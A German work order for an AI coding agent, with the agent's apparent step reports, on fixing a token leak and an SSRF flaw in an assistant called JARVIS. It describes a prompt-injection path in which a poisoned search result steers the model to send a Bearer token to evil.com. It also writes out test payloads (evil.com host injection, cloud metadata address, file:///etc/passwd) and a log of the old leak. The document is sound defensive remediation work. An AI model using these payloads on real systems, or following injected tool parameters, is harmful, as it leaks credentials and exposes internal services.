# REPARATURAUFTRAG 03 — DIE DREI, DIE VON AUSSEN AUSLÖSBAR SIND

> Ablegen als `docs/FIX-03.md`. In Claude Code im Projektordner:
> `Lies docs/FIX-03.md und arbeite die Schritte der Reihe nach ab. Bei Schritt 0 anfangen.`
>
> **Dieser Auftrag ersetzt die Reihenfolge in BUGS-01.md.** Nicht von oben abarbeiten.
> Die Funde 5 und 6 stehen dort auf Platz fünf und sechs, sind aber die einzigen, die
> ohne jede Fehlbedienung durch fremde Inhalte ausgelöst werden. Sie kommen zuerst.

## Befund

Aus dem Audit, drei Funde, zusammengefasst nach Ursache statt nach Fundnummer:

- **wiki_live** baut den Hostnamen aus einem Modellparameter. `sprache="evil.com/"` schickt
  den `Authorization: Bearer`-Header an einen fremdbestimmten Host. Auslöser: ein vergifteter
  Suchtreffer. (BUGS-01 Fund 5)
- **fetch_url** hat keine Sperre gegen interne Adressen. `http://127.0.0.1:PORT/admin` wird
  geholt, der Inhalt landet im Modellkontext. (BUGS-01 Fund 6)
- **Abbruch und Budget greifen nur zwischen Schritten.** Bei einem Ein-Schritt-Plan — und
  darauf ist der Planner laut Phase-4-Spezifikation getrimmt — greift beides nie. Nach
  `cancel` laufen weiter bezahlte Modellaufrufe, eine offene Bestätigung wird nicht geweckt,
  der Auftrag meldet am Ende `done`. (BUGS-01 Fund 1 und Fund 4 — **eine** Ursache, **eine**
  Reparatur.)

**Nicht in diesem Auftrag:** scripts.backup, der 500er bei Nicht-ASCII im Token, der Vault-Riss.
Die bleiben in BUGS-01.md offen und kommen danach.

## Regeln für diese Session

1. Ein Schritt nach dem anderen, jeder mit ausgeführter Ausgabe, dann committen.
2. **Kein Schritt gilt als fertig ohne Negativtest.** Ein Fix, der nur den Gutfall zeigt,
   ist nicht nachgewiesen.
3. Kein Limit, Timeout oder Retry hochsetzen, damit etwas durchläuft.
4. Keine Reparatur nur im Frontend. Wenn ein Knopf etwas nicht mehr auslösen soll, muss
   **der Endpunkt** es ablehnen. Ein ausgegrauter Knopf ist keine Sperre.
5. Wenn ein Schritt etwas Unerwartetes aufdeckt: melden und stoppen.

---

## SCHRITT 0 — Feststellen, ob der Token schon draußen ist

Nichts ändern. Nur beantworten:

```bash
grep -rn "Authorization\|Bearer" --include="*.py" . | grep -v test
grep -rn "Session()\|headers.update\|default_headers" --include="*.py" . | grep -v test
sqlite3 data/jarvis.db "select * from task_log where tool like '%wiki%' or tool like '%fetch%' limit 50;"
```

Zu berichten, mit Datei und Zeilennummer:

- **Warum trägt ein Aufruf an Wikipedia überhaupt einen Auth-Header?** Der wahrscheinliche
  Grund ist eine gemeinsam genutzte Session mit Standard-Headern. Wenn ja: welche Stelle.
- Gibt es im `task_log` oder in den Logs einen Aufruf mit einem Host, der nicht auf
  `wikipedia.org` endet? Wenn ja: Datum und Host nennen.

**Danach anhalten und melden.** Wenn der Token je nach außen ging, muss Noah ihn beim
Anbieter neu ausstellen, bevor irgendetwas repariert wird — ein Code-Fix holt einen bereits
verschickten Header nicht zurück. Erst nach seiner Bestätigung mit Schritt 1 weitermachen.

Abnahme: Bericht mit Fundstellen, plus explizites „Token rotiert" von Noah.

---

## SCHRITT 1 — wiki_live: Host aus einer Konstante, Auth nie nach draußen

Zwei Änderungen, beide nötig. Die erste allein reicht nicht.

**1a — Der Host wird nie zusammengesetzt.** Keine Interpolation eines Parameters in den
Host-Teil einer URL, nirgends. Stattdessen eine feste Zuordnung im Modul:

```python
WIKI_HOSTS = {
    "de": "https://de.wikipedia.org",
    "en": "https://en.wikipedia.org",
}
```

Ist `sprache` nicht als Schlüssel enthalten, wird der Aufruf **abgelehnt**, nicht auf einen
Standardwert zurückgefallen. Ein unbekannter Sprachcode ist ein fehlgeschlagener Schritt,
kein Anlass zum Raten.

**1b — Der Auth-Header verlässt die eigene API nicht.** Zwei getrennte HTTP-Clients:
einer für die eigene API, der die Anmeldedaten trägt, und einer für alles nach draußen,
der grundsätzlich keine Auth-Header setzt. Werkzeuge, die fremde Inhalte holen, benutzen
ausschließlich den zweiten.

Das ist die eigentliche Reparatur. 1a schützt eine Stelle, 1b schützt jede, die noch kommt.

---

## SCHRITT 2 — fetch_url: interne Adressen sperren

Vor jedem Verbindungsaufbau, in dieser Reihenfolge:

1. **Schema prüfen.** Nur `http` und `https`. Alles andere — `file:`, `gopher:`, `ftp:`,
   `data:` — wird abgelehnt.
2. **Namen auflösen** und **jede** zurückgegebene Adresse prüfen, nicht nur die erste.
3. **Blockieren, wenn die Adresse nicht öffentlich ist.** In Python deckt
   `ipaddress.ip_address(adr).is_global` das in einer Prüfung ab: Loopback, private Bereiche,
   Link-Local (darunter `169.254.169.254`, die Metadaten-Adresse von Cloud-Anbietern),
   reservierte und Multicast-Bereiche gelten alle als nicht global. IPv6 mitprüfen, nicht
   nur IPv4.
4. **Weiterleitungen nicht automatisch folgen.** `allow_redirects=False`, dann jede Station
   von Hand durchlaufen und bei **jeder** die Prüfung aus 1–3 erneut ausführen. Ein Server,
   der auf `127.0.0.1` weiterleitet, ist der Standardweg um eine Eingangsprüfung herum.
5. **Antwortgröße begrenzen**, damit eine große Datei nicht den Modellkontext flutet.

**Bekannter Restfehler, der bestehen bleibt und dokumentiert gehört:** zwischen Auflösen und
Verbinden kann sich der Name auf eine andere Adresse ändern. Das vollständig zu schließen
hieße, direkt auf die geprüfte Adresse zu verbinden. Das ist hier nicht gefordert — aber es
gehört als bekannte Grenze in den Code-Kommentar, nicht als stillschweigend gelöst behandelt.

---

## SCHRITT 3 — Abbruch und Budget innerhalb des Schritts

Eine Änderung für BUGS-01 Fund 1 und Fund 4.

**3a — Ein Prüfpunkt vor jedem teuren Aufruf.** Nicht an der Schrittgrenze, sondern
unmittelbar vor jedem Modell- und jedem Werkzeugaufruf. Eine Funktion, die den
Abbruch-Wunsch und alle drei Grenzen (`max_tokens`, `max_cost_eur`, `max_seconds`) prüft
und beim Überschreiten abbricht, statt einen Rückgabewert zu liefern, den jemand vergessen
kann auszuwerten.

**3b — Die Bestätigung muss weckbar sein.** Das Warten auf `POST /confirm` wartet ab jetzt
auf zwei Ereignisse gleichzeitig — Bestätigung oder Abbruch, je nachdem was zuerst kommt.
Ein `cancel` bei offener Rückfrage muss den Auftrag sofort beenden.

**3c — Der Endpunkt lehnt ab.** `POST /api/tasks/{id}/confirm` gibt einen Fehler zurück,
wenn der Auftrag nicht mehr `NEEDS_CONFIRMATION` ist. Ohne diese Zeile bleibt die Mail
verschickbar, egal wie der Knopf im Frontend aussieht.

**3d — Der Endzustand heißt `cancelled`.** Ein abgebrochener Auftrag meldet nie `done`.

---

## Definition of Done

Jeder Punkt mit ausgeführtem Befehl und echter Ausgabe. Keine Beschreibung dessen, was
passieren würde.

1. `wiki_live(sprache="evil.com/")` → abgelehnt, kein ausgehender Aufruf. Im Mitschnitt
   nachgewiesen, dass keine Verbindung zu `evil.com` aufgebaut wurde.
2. `grep -rn 'https://{' --include="*.py" .` findet keine Stelle, an der ein Parameter in
   den Host-Teil interpoliert wird.
3. Ein Aufruf von `wiki_live` gegen einen lokalen Testserver, der alle Header mitschreibt →
   **kein** `Authorization`-Header in der Aufzeichnung.
4. `fetch_url("http://127.0.0.1:8080/admin")` → abgelehnt. Ebenso `http://169.254.169.254/`,
   `http://[::1]/`, `file:///etc/passwd`.
5. Ein Testserver antwortet mit einer Weiterleitung auf `http://127.0.0.1:8080/` →
   ebenfalls abgelehnt, mit Angabe der Station, an der es gestoppt wurde.
6. Ein Ein-Schritt-Plan mit `max_cost_eur=0.0001` endet mit `aborted_budget`, **bevor** der
   zweite Modellaufruf startet. Zeilenzahl in `llm_calls` nachgezählt, nicht geschätzt.
7. Abbruch während offener Bestätigung → Auftrag ist innerhalb von zwei Sekunden
   `cancelled`. Danach `POST /confirm` auf denselben Auftrag → Fehler, und die Zieldatei
   von `send_email` ist unverändert. Prüfsumme vorher und nachher.
8. Kein Auftrag im `task_log` steht nach einem Abbruch auf `done`.

---

## Was du nicht tun sollst

- Eine Sperrliste bekannter böser Hostnamen bauen. Geprüft wird die **aufgelöste Adresse**,
  nicht der Name.
- `is_private` allein benutzen und Link-Local vergessen. Die Metadaten-Adresse der
  Cloud-Anbieter liegt genau dort.
- Den Abbruch nur im Frontend reparieren.
- Prüfartefakte — Screenshots, Testausgaben, geskriptete Datensätze — im selben Verzeichnis
  ablegen wie echte Ausgaben. Eigenes Verzeichnis, erkennbares Präfix. Genau das ist der
  Grund, warum ein Testbild als Befund über die ausgelieferte Anwendung zurückgelaufen ist.
- Die drei Grenzwerte hochsetzen, damit Punkt 6 durchläuft.

---

## BEFUND SCHRITT 0 — ausgeführt am 26.08.2026

Alle Angaben aus ausgeführten Befehlen, nichts aus gelesenem Code geschlossen.

### 1. `grep -rn "Authorization\|Bearer" --include="*.py" . | grep -v test`

```
./core/satellite/cdse.py:214:                headers={"Authorization": f"Bearer {zugang}"},
./core/tools/wissen_tools.py:35:# Authorization-Header an einen fremden Server. Ein Sprachcode nach BCP 47 ist
./core/tools/wissen_tools.py:264:            kopf["authorization"] = f"Bearer {self.token}"
```

Zwei echte Stellen. `cdse.py:214` spricht mit Copernicus und trägt dessen eigenes
Token — unauffällig. `wissen_tools.py:264` ist die fragliche.

### 2. `grep -rn "Session()\|headers.update\|default_headers" --include="*.py" . | grep -v test`

**Kein Treffer.**

### 3. `sqlite3 data/jarvis.db "select * from task_log where …"`

`sqlite3` ist in dieser Umgebung nicht installiert; dieselbe Abfrage über Pythons
`sqlite3`:

```
data/jarvis.db existiert: False
-> keine Abfrage moeglich; in diesem Klon hat JARVIS nie gelaufen.
```

`find . -name "*.db" -o -name "*.log"` → kein Treffer. `.env` existiert nicht.
`.gitignore` Zeile 1 `.env`, Zeile 8 `data/`.

### Warum trägt ein Wikipedia-Aufruf einen Auth-Header?

**Nicht wegen einer gemeinsam genutzten Session.** Die Vermutung aus FIX-03 trifft für
dieses Repository nicht zu — es gibt keine geteilte Session, keine Standard-Header und
keinen geteilten Client. `core/tools/wissen_tools.py:266-268` baut für **jeden** Aufruf
einen eigenen `httpx.AsyncClient` in einem `async with` und schließt ihn wieder.

Der Header steht in genau einer bewussten Zeile, `wissen_tools.py:263-264`:

```python
if self.token:
    kopf["authorization"] = f"Bearer {self.token}"
```

`self.token` ist `WIKI_API_TOKEN` (`core/config.py:64`, Alias `WIKI_API_TOKEN`), ein
**Wikimedia**-Token. Es ist nicht der LLM-Key und nicht `JARVIS_TOKEN`. Der Grund steht
in `wissen_tools.py:236`: er hebt das Ratenlimit von 500 auf 5.000 Anfragen pro Stunde
(`docs/wissensquellen.md:231`).

Der Header gehört also dem richtigen Dienst. Gefährlich war nicht der Header, sondern
dass der **Zielhost** aus einem Modellparameter zusammengesetzt wurde.

### Ist der Token je nach außen gegangen?

**In diesem Klon: nein, ausgeschlossen.** Es gibt keine `.env`, keine Datenbank, keine
Logdatei — JARVIS ist hier nie gelaufen.

**Auf Noahs Rechner: nur unter drei Bedingungen gleichzeitig.** Das verwundbare Fenster
ist exakt bestimmbar:

```
cb0a52a 2026-08-25T16:01:38+00:00 feat: Wissensquellen - wiki_lokal, wiki_live, wikidata mit Cache
f1d5e22 2026-08-26T03:18:49+00:00 fix: drei Sicherheits- und Robustheitsfunde aus BUGS-01
```

→ **11 Stunden 17 Minuten.** `cb0a52a` brachte den Auth-Header, `f1d5e22` die
Sprachcode-Prüfung.

Damit in diesem Fenster etwas hätte abfließen können, musste **alles drei** zutreffen:

1. `WIKI_API_TOKEN` in der `.env` gesetzt — ohne ihn wird der Header nie gesetzt
   (`wissen_tools.py:263`, Default `""` in `config.py:64`).
2. `WIKI_KONTAKT` gesetzt — `wiki_live` steigt **vorher** aus, wenn er fehlt. Diese
   Prüfung stand schon in `cb0a52a` an derselben Stelle, vor jedem Verbindungsaufbau.
3. Ein Modelllauf, in dem `wiki_live` mit einem bösartigen `sprache`-Wert aufgerufen
   wurde. Das setzt einen vergifteten Suchtreffer voraus, der dem Modell einen
   Sprachcode wie `evil.com/` unterschiebt.

`git log --all --diff-filter=A --name-only -- '*.env' '.env' '*.db' 'data/*'` → **kein
Treffer.** Es wurde nie ein Geheimnis ins Repository committet.

### Was Noah auf seinem Rechner prüfen muss

```bash
grep -n "WIKI_API_TOKEN\|WIKI_KONTAKT" .env
sqlite3 data/jarvis.db "select created_at, tool, arguments, ok from tool_calls where name like '%wiki%' order by id desc limit 50;"
sqlite3 data/jarvis.db "select min(created_at), max(created_at) from llm_calls;"
```

Steht bei `WIKI_API_TOKEN` nichts hinter dem `=`, ist der Fall erledigt. Steht dort ein
Token **und** liegen Aufrufe zwischen dem 25.08. 16:01 UTC und dem 26.08. 03:18 UTC, dann
gehört er neu ausgestellt, bevor hier weitergearbeitet wird.

### Nebenbefund, nicht Teil von Schritt 0

`DoD 2` ist **heute noch nicht erfüllt**:

```
./core/tools/wissen_tools.py:200:        GET https://{sprache}.wikipedia.org/w/rest.php/v1/search/page?q=…&limit=…
./core/tools/wissen_tools.py:270:                    f"https://{sprache}.wikipedia.org/w/rest.php/v1/search/page",
./core/tools/wissen_tools.py:300:        url = f"https://{sprache}.wikipedia.org/wiki/{urllib.parse.quote(str(erste.get('key') or titel))}"
./scripts/healthcheck.py:23:    url = f"http://{ziel}:{port}/api/health"
```

Die Reparatur aus `f1d5e22` prüft den Sprachcode mit einem regulären Ausdruck, setzt
den Host aber weiterhin zusammen. Das ist **nicht**, was Schritt 1a verlangt.

---

## ERGEBNIS SCHRITT 1 — ausgeführt am 26.08.2026

### 1a — Der Host kommt aus einer Konstante

`core/tools/wissen_tools.py`: `WIKI_HOSTS` ersetzt den regulären Ausdruck aus
`f1d5e22`. Der war zu schwach — `"xx"` besteht jeden BCP-47-Test und ergibt trotzdem
einen Host, den niemand geprüft hat. Ein Code, der nicht in der Zuordnung steht, wird
abgelehnt und **nicht** auf `de` zurückgefallen.

Auch `scripts/healthcheck.py` baut den Host nicht mehr aus `JARVIS_HOST` zusammen,
sondern prüft ihn erst. Der Wert kommt dort nicht aus einem Modell — aber „nirgends"
heißt nirgends, und eine Regel mit einer Ausnahme ist eine Regel, der niemand traut.

### 1b — Zwei Klienten

Neu: `core/netz.py`.

* `nach_draussen()` — verweigert **jede** Anfrage, die `authorization`,
  `proxy-authorization`, `cookie`, `x-api-key` oder `x-jarvis-token` trägt.
* `fuer_dienst(hosts)` — verweigert **jede** Anfrage an einen Host außerhalb von
  `hosts`. Darf dorthin Anmeldedaten tragen.

Beide prüfen als `event_hook` und damit **vor** dem Transport. Ausgeführt:

```
2) nach_draussen MIT Authorization
   abgewiesen: Anfrage an beispiel.test traegt authorization…
   beim Transport angekommen: 0
5) fuer_dienst an einen FREMDEN Host
   abgewiesen: Anfrage an 'evil.com', erlaubt sind nur de.wikipedia.org…
   beim Transport angekommen: 0
```

Verdrahtet: `wiki_live` → `fuer_dienst(WIKI_DIENST_HOSTS)`, `wikidata` →
`fuer_dienst({"query.wikidata.org"})`, `wiki_lokal` → `nach_draussen()`.

### DoD 1 — böser Sprachcode, kein ausgehender Aufruf

```
--- mit WIKI_KONTAKT, mit Token, boeser Sprachcode ---
  ok=False  error='evil.com/' ist keine eingerichtete Wikipedia. Verfuegbar: de, en, es, fr, it, ja, nl, pl,…
  ausgehende Anfragen: 0
```

Zum Vergleich derselbe Aufruf gegen den Stand `cb0a52a` — die Kopie liegt im
Prüfverzeichnis, das Repository wurde dafür nicht angefasst:

```
--- ALT: mit WIKI_KONTAKT, mit Token, boeser Sprachcode ---
  ok=True    ausgehende Anfragen: 1
    -> HOST: evil.com
       URL:  https://evil.com/.wikipedia.org/w/rest.php/v1/search/page?q=Bergisel&limit=3
       Authorization: Bearer GEHEIM-123
```

### DoD 2 — kein Parameter im Host-Teil

```
$ grep -rn 'https://{' --include="*.py" .
$
```

Kein Treffer, repository-weit. `tests/test_fix03.py` hält das mit einem eigenen
Scanner fest, der auch `.format` und `http://` erfasst — plus einer Gegenprobe, dass
der Scanner so eine Stelle überhaupt findet.

### DoD 3 — ein fremder Server sieht nie einen Authorization-Header

Ein echter `HTTPServer` auf `127.0.0.1`, der jede Kopfzeile mitschreibt. `wiki_live`
wird über den einzigen Hebel, den ein Modell hat, darauf zu lenken versucht:
`sprache` = `127.0.0.1:PORT`, `127.0.0.1`, `localhost`, `evil.com:PORT/`, `xx`.

Aufzeichnung: **leer.** Der Server hat keine einzige Anfrage gesehen.

### Gegenproben

Sechs Mutationen einzeln gefahren, jede fällt:

| Mutation | Ergebnis |
|---|---|
| unbekannter Code fällt auf `de` zurück | 9 Tests rot |
| wieder ein blanker `AsyncClient` in `wiki_live` | 1 Test rot |
| Anmeldedaten-Hook lässt durch | 1 Test rot |
| Dienst-Hook prüft nichts | 2 Tests rot |
| `healthcheck` ohne Hostprüfung | 1 Test rot |

Volle Suite: **612 passed.** Rauchtest bestanden.

### Bewusst verengt, nicht versehentlich

`tests/test_bugs01.py::test_fund6_ein_normaler_sprachcode_geht_weiterhin` prüfte
vorher `de`, `en`, `als`, `zh-yue`. `als` und `zh-yue` gibt es bei Wikipedia, sie
stehen aber nicht in `WIKI_HOSTS` und werden jetzt abgelehnt. Der Test wurde nicht
entschärft, sondern erweitert: er hält beide Seiten fest — den Normalfall **und**
dass die beiden anderen bewusst draußen sind. Wer sie braucht, trägt sie ein; eine
Zeile, sichtbar im Produktivcode.
